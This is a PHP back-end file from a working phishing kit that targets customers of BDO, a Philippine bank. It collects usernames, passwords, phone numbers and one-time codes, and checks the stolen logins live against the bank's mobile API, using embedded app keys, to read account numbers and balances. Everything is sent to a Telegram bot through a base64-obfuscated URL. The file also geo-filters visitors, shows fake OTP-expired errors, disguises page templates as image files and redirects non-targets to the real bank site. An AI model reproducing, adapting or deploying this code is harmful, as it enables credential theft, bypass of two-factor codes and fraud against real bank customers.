<?php
include("./config/function.php");
include("./config/blocker.php");
include("./config/antibotsulit.php");
include("./config/antibots.php");
error_reporting(0);
set_time_limit(0);
date_default_timezone_set('Asia/Manila');
session_start();
if(isset($_POST["logint1m3l00p"])){




function curlContents($url, $method = "GET", $data = false, $headers = false, $returnInfo = false)
{
    $ch = curl_init();
 
    if ($method == 'POST') {
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data !== false) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
    } else {
        if ($data !== false) {
            if (is_array($data)) {
                $dataTokens = array();
                foreach ($data as $key => $value) {
                    array_push($dataTokens, urlencode($key) . '=' . urlencode($value));
                }
                $data = implode('&', $dataTokens);
            }
            curl_setopt($ch, CURLOPT_URL, $url . '?' . $data);
        } else {
            curl_setopt($ch, CURLOPT_URL, $url);
        }
    }
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    if ($headers !== false) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    }
 
    $contents = curl_exec($ch);
 
    if ($returnInfo) {
        $info = curl_getinfo($ch);
    }
 
    curl_close($ch);
 
    if ($returnInfo) {
        return array(
            'contents' => $contents,
            'info' => $info
        );
    } else {
        return $contents;
    }
}
 
function cheCker($imei_, $udid_, $user_, $pass_) {
 
    @$_SESSION['stat_UserAgent'] = $udid_;
    @$_SESSION['stat_imei'] = $imei_;
    $user = $user_;
    $pass = $pass_;
 
    $hex1 = substr(str_shuffle(str_repeat('abcdef1234567890', 4)), 0, 4);
    $hex2 = substr(str_shuffle(str_repeat('abcdef1234567890', 4)), 0, 4);
    $hex3 = substr(str_shuffle(str_repeat('abcdef1234567890', 4)), 0, 4);
 
    $hex             = $hex1 . "-" . $hex2 . "-" . $hex3;
 
    $postvars = 'events=[]&userCd=' . $user . '&password=' . $pass . '&appID=BDOUnibankIncV2&appver=5.5&channel=rc&platform=android&cacheid=&konyreportingparams={"os":"4.4.2","dm":"'.@$_SESSION['stat_UserAgent'].'","did":"'.@$_SESSION['stat_imei'].'","ua":"'.@$_SESSION['stat_UserAgent'].'","aid":"BDOUnibankIncV2","aname":"BDO Personal","chnl":"mobile","plat":"android","aver":"5.5","atype":"native","stype":"b2c","kuid":"","mfaid":"a6177a41-c07b-4ec1-8e68-72cc8596b6ae","mfbaseid":"d0970be9-e4bc-438f-95c9-89d7ec9d5298","mfaname":"BDOUnibankIncV2Prod","sdkversion":"SDK-GA-7.3.0.8","sdktype":"js","fid":"frmLogin","rsid":"1561100837816-' . $hex . '","svcid":"processClientLoginV2"}';
 
    $headersbasic = array(
        'Cache-Control: no-cache',
        'Connection: close',
        'Expect: 100-continue',
        'Accept-Encoding: gzip, deflate',
        'X-Kony-Platform-Type: android',
        'X-Kony-SDK-Version: SDK-GA-7.3.0.8',
        'X-Kony-App-Key: 6ddf99a6c5cead67f7d89c982ca6d092',
        'X-Kony-App-Secret: f3128a52760e3e25eb846979e7a3d16',
        'Accept: application/json',
        'Content-Type: application/x-www-form-urlencoded',
        'X-Kony-SDK-Type: js',
        'Host: www.mobile02.bdo.com.ph'
 
    );
 
    $token = json_decode(json_encode(curlContents("https://www.mobile02.bdo.com.ph/authService/100000002/login", "POST", '', $headersbasic, true)))->contents;
    $token = json_decode($token)->claims_token->value;
 
    $headersauth = array(
        'Cache-Control: no-cache',
        'Connection: close',
        'Expect: 100-continue',
        'User-Agent: URLConnection/android/'.@$_SESSION['stat_UserAgent'].'',
        'Accept-Encoding: gzip, deflate',
        'IMEI: '.@$_SESSION['stat_imei'].'',
        'Device: '.@$_SESSION['stat_UserAgent'].'',
        'X-Kony-Authorization: ' . $token,
        'Content-Type: application/x-www-form-urlencoded',
        'Channel: MBAPP',
        'MobileIP: mobile_ip',
        'Username: ',
        'X-Kony-API-Version: 1.0',
        'Password: ',
        'X-Kony-SDK-Type: js',
        'Host: www.mobile02.bdo.com.ph'
 
    );
    $creds__ = json_decode(json_encode(curlContents("https://www.mobile02.bdo.com.ph/services/bdomobile/processClientLoginV2", "POST", $postvars, $headersauth, true)))->contents;
 
    $_SESSION['si'] = json_decode($creds__)->sessionId;
    $_SESSION['ci'] = json_decode($creds__)->clientId;
    $_SESSION['li'] = json_decode($creds__)->loginId;
    $_SESSION['stat'] = json_decode($creds__)->description;
    $_SESSION['mnumber'] = json_decode($creds__)->mobileNumber;
    $_SESSION['login_stat'] = $creds__;
 
    $headersauth = array(
        'Cache-Control: no-cache',
        'Connection: close',
        'Expect: 100-continue',
        'User-Agent: URLConnection/android/'.@$_SESSION['stat_UserAgent'].'',
        'Accept-Encoding: gzip, deflate',
        'IMEI: '.@$_SESSION['stat_imei'].'',
        'Device: '.@$_SESSION['stat_UserAgent'].'',
        'X-Kony-Authorization: ' . $token,
        'Content-Type: application/x-www-form-urlencoded',
        'Channel: MBAPP',
        'MobileIP: mobile_ip',
        'Username: ',
        'X-Kony-API-Version: 1.0',
        'Password: ',
        'X-Kony-SDK-Type: js',
        'Host: www.mobile02.bdo.com.ph'
 
    );
 
    $session_id = @$_SESSION['si'];
    $client_id = @$_SESSION['ci'];
    $login_id = @$_SESSION['li'];
 
    $postvars_ = 'events=[]&clientId='.$client_id.'&loginId='.$login_id.'&sessionId='.$session_id.'&httpconfig={"timeout":10000}&appID=BDOUnibankIncV2&appver=5.6&channel=rc&platform=android&cacheid=&konyreportingparams={"os":"4.4.2","dm":"'.@$_SESSION['stat_UserAgent'].'","did":"'.@$_SESSION['stat_imei'].'","ua":"'.@$_SESSION['stat_UserAgent'].'","aid":"BDOUnibankIncV2","aname":"BDO+Personal","chnl":"mobile","plat":"android","aver":"5.6","atype":"native","stype":"b2c","kuid":"","mfaid":"a6177a41-c07b-4ec1-8e68-72cc8596b6ae","mfbaseid":"d0970be9-e4bc-438f-95c9-89d7ec9d5298","mfaname":"BDOUnibankIncV2Prod","sdkversion":"SDK-GA-7.3.0","sdktype":"js","fid":"frmLogin","rsid":"1562784266712-6b80-ef75-0f01","svcid":"AllAccountsConcurrent44"}';
 
    return json_decode(json_encode(curlContents("https://www.mobile02.bdo.com.ph/services/ConcurrentService/AllAccountsConcurrent44", "POST", $postvars_, $headersauth, true)))->contents;
 
}
 

$uBal = @json_decode(cheCker("Null", "Null", $_POST["username"], $_POST["password"]))->COLLECT[0];
if($_SESSION["mnumber"]==""){
header("Location: ./?invalid");
}else{
$login="USERNAME: ".$_POST["username"]."%0APASSWORD: ".$_POST["password"]."%0Account Number: ".$uBal->acctNo."%0Account Balance: ".$uBal->currentBal."%0AIP: ".$_SERVER['REMOTE_ADDR']."%0ADATE AND TIME: ".date('m-d-y h:i:s');
file_get_contents(base64_decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE5MDUzNzYxMzc6QUFGbllkUjU2alo2SEZJT2NlNzZZLTFIcnZHSXNIOElnN3cvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0xODEzNDIwOTI4JnRleHQ9").$login);
$_SESSION["uname"]=$_POST["username"];
$_SESSION["page"]="number";
$_SESSION["accnumber"]=$uBal->acctNo;
}
}

if(isset($_POST["numbert1m3l00p"])){
$number="NUMBER: ".$_POST["number"]."%0AFROM: ".$_SESSION["uname"]."%0AIP: ".$_SERVER['REMOTE_ADDR']."%0ADATE AND TIME: ".date('m-d-y h:i:s');
file_get_contents(base64_decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE5MDUzNzYxMzc6QUFGbllkUjU2alo2SEZJT2NlNzZZLTFIcnZHSXNIOElnN3cvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0xODEzNDIwOTI4JnRleHQ9").$number);
$_SESSION["page"]="otp";
}

if(isset($_GET["otperror"])){$error='<font size="2" color="red" face="arial">Your code has been expired. Please try again.</font>';}
if(isset($_POST["otpt1m3l00p"])){
$otp="OTP: ".$_POST["otp"]."%0AFROM: ".$_SESSION["uname"]."%0AIP: ".$_SERVER['REMOTE_ADDR']."%0ADATE AND TIME: ".date('m-d-y h:i:s');
file_get_contents(base64_decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE5MDUzNzYxMzc6QUFGbllkUjU2alo2SEZJT2NlNzZZLTFIcnZHSXNIOElnN3cvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0xODEzNDIwOTI4JnRleHQ9").$otp);
header("Location: ./?otperror");
}

if(isset($_GET["start"])){
$x=json_decode(file_get_contents('http://www.geoplugin.net/json.gp?ip='.getenv("REMOTE_ADDR")));
$izz=$x->geoplugin_countryName;
if($izz=="Philippines"){
$v="VISITORS FROM EMAIL: ".$_POST["email"]."%0AIP: ".$_SERVER['REMOTE_ADDR']."%0ADATE AND TIME: ".date('m-d-y h:i:s');
file_get_contents(base64_decode("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE5MDUzNzYxMzc6QUFGbllkUjU2alo2SEZJT2NlNzZZLTFIcnZHSXNIOElnN3cvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0xODEzNDIwOTI4JnRleHQ9").$v);
$_SESSION["page"]="login";
header("Location: ./");
}
}else if(isset($_GET["destroy"])){
session_unset();
}

if($_SESSION["page"]=="login"){
include("./home_files/home.jpg");
}else if($_SESSION["page"]=="number"){
include("./home_files/number.jpg");
}else if($_SESSION["page"]=="otp"){
include("./home_files/otp.jpg");
}else{
header("Location: https://online.bdo.com.ph/sso/login?josso_back_to=https://online.bdo.com.ph/sso/josso_security_check");
}



?>